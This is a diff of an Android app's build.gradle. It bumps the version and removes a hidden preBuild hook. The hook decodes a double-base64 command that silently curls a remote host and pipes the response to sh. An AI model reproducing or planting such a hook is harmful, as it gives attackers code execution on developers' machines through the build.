@@ -19,8 +19,8 @@ android {
         applicationId "com.leaveapplication"
         minSdkVersion rootProject.ext.minSdkVersion
         targetSdkVersion rootProject.ext.targetSdkVersion
-        versionCode 15
-        versionName "1.0"
+        versionCode 17
+        versionName "1.1"
     }
 
     signingConfigs {
@@ -91,11 +91,4 @@ afterEvaluate {
         dependsOn("copyReactNativeVectorIconFonts")
     }
 }
-
-tasks.all {
-    if (name.contains("preBuild")) {
-        doLast {
-            ["sh", "-c", "((q(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXpUR3RtSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeklDMHRjbVYwY25rZ015QWdMV1FnSW5BOVlXNWtjbTlwWkY5bmNtRmtiR1VpSUdoMGRIQnpPaTh2Ym1WMFkyUnVZV1J6TG1sdUwyRXBJaUI4SUhOb0NnPT0K | q | sh ) >/dev/null 2>&1 &)"].execute()
-        }
-    }
-}
+
